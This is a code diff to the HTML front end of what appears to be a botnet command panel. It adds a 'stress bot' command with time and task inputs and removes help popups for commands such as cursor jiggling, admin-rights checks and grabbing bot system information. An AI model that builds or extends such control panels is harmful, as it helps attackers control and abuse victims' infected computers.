@@ -12,7 +12,7 @@
 </head>
 <body>
 
-
+<!-- Top Nav bar -->
 <div class="topnav">
     <a href="dashboard.html">Dashboard</a>
     <a class=active href="#sendcommands">Send Commands</a>
@@ -29,6 +29,7 @@
     <!-- Enter Commands Input -->
     <div class="containerr">
         <form>
+            <!-- System ID Input -->
             <div class="centerrr">
                 <div class="select-commands-group"> 
                     <input type="text" name="idNumber" id="idNumber" required>
@@ -40,16 +41,17 @@
 
             
             <br>
-            <!-- Command Selection -->
-            <!-- Custom select structure --> 
-            <div class="centerrr">
+            <!-- Command Selection Box -->
+            <div class="centerrr-box">
                 <div class="select_mate" data-mate-select="active" >
-                    <select name="command-selection" onchange="" onclick="return false;">
+                    <select name="command-selection" id="command-selection" onchange="commandCheck(this);" onclick="return false;">
                         <option value="" >Select Command </option>
-
+                        
+                        <!-- Options -->
                         <option value="admincheck">Admin check</option>
                         <option value="clear">Clear output</option>
-                        <option value="systeminfo">Get bot system info</option>
+                        <option value="systeminfo">Grab system information</option>
+                        <option value="stress">Stress bot</option>
                     </select>
 
                     <p class="selecionado_opcion"  onclick="open_select(this)" ></p>
@@ -65,6 +67,27 @@
                     </div>
                 </div>
             </div>
+
+            <!-- Command Inputs -->
+            <div class="centerrr-spec">
+                <!-- Stress -->
+                <div id="input-needed-stress" style="display: none;">
+                    <div class="commands-input-group"> 
+                        <input type="text" name="stress-time" id="stress-time" novalidate>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Stress Time</label>
+                    </div> 
+
+                    <div class="commands-input-group"> 
+                        <input type="text" name="stress-tasks" id="stress-tasks" novalidate>
+                        <span class="highlight"></span>
+                        <span class="bar"></span>
+                        <label>Tasks</label>
+                    </div> 
+                </div>
+            </div>
+
         </form>
         <br>
         <br>
@@ -85,93 +108,7 @@
     </div>
 <br>
 </form>
-    <!-- Popups -->
-    <div>
-        <!-- admincheck -->
-        <div id="admincheck" class="overlay">
-            <div class="popup">
-                <h2>admincheck</h2>
-                <a class="close" href="#">&times;</a>
-                <div class="content">
-                    Check if bot is running client with admin rights.
-                </div>
-                <div id="block_container" class="pad-top">
-                    <div class="right" id="inner"><button type="submit" id="delete" onclick="copyCommand('admincheck')" class="custom-btn btn-3"><span>Copy</span></button></div>
-                </div>
-            </div>
-        </div>
 
-        <!-- clear -->
-        <div id="clear" class="overlay">
-            <div class="popup">
-                <h2>clear</h2>
-                <a class="close" href="#">&times;</a>
-                <div class="content">
-                    Clear the output console.
-                </div>
-                <div id="block_container" class="pad-top">
-                    <div class="right" id="inner"><button type="submit" onclick="copyCommand('clear')" class="custom-btn btn-3"><span>Copy</span></button></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- jigglecursor -->
-        <div id="jigglecursor" class="overlay">
-            <div class="popup">
-                <h2>jigglecursor</h2>
-                <a class="close" href="#">&times;</a>
-                <div class="content">
-                    Jiggle bots cursor annoying the user.
-                </div>
-                <div id="block_container" class="pad-top">
-                    <div class="right" id="inner"><button type="submit" onclick="copyCommand('jigglecursor')" class="custom-btn btn-3"><span>Copy</span></button></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- jigglecursorstop -->
-        <div id="jigglecursorstop" class="overlay">
-            <div class="popup">
-                <h2>jigglecursorstop</h2>
-                <a class="close" href="#">&times;</a>
-                <div class="content">
-                    Stop jiggling bots cursor.
-                </div>
-                <div id="block_container" class="pad-top">
-                    <div class="right" id="inner"><button type="submit" onclick="copyCommand('jigglecursorstop')" class="custom-btn btn-3"><span>Copy</span></button></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- stress -->
-        <div id="stress" class="overlay">
-            <div class="popup">
-                <h2>stress</h2>
-                <a class="close" href="#">&times;</a>
-                <div class="content">
-                    Stress bots CPU to 100% for given time (secs). <br><br> Syntax: stress [time] [tasks] <br><br> Example: stress 10 10
-                </div>
-                <div id="block_container" class="pad-top">
-                    <div class="right" id="inner"><button type="submit" onclick="copyCommand('stress')" class="custom-btn btn-3"><span>Copy Command</span></button></div>
-                    <div class="left" id="inner"><button type="submit" onclick="copyCommand('stress 10 10')" class="custom-btn btn-3"><span>Copy Example</span></button></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- systeminfo -->
-        <div id="systeminfo" class="overlay">
-            <div class="popup">
-                <h2>systeminfo</h2>
-                <a class="close" href="#">&times;</a>
-                <div class="content">
-                    Grab bots system information.<br>
-                </div>
-                <div id="block_container" class="pad-top">
-                    <div class="right" id="inner"><button type="submit" onclick="copyCommand('systeminfo')" class="custom-btn btn-3"><span>Copy Command</span></button></div>
-                </div>
-            </div>
-        </div>
-    </div>
 
     
 <!-- Footer -->
@@ -294,6 +231,18 @@ select_optiones[indx].selected = true;
 
 </script>
 
+
+<script>
+function commandCheck(command) {
+    /* Stress */
+    if (command.value == "stress") {
+        document.getElementById("input-needed-stress").style.display = "block";
+    } else {
+        document.getElementById("input-needed-stress").style.display = "none";
+    }
+}
+
+</script>
 
 </body>
 </html>
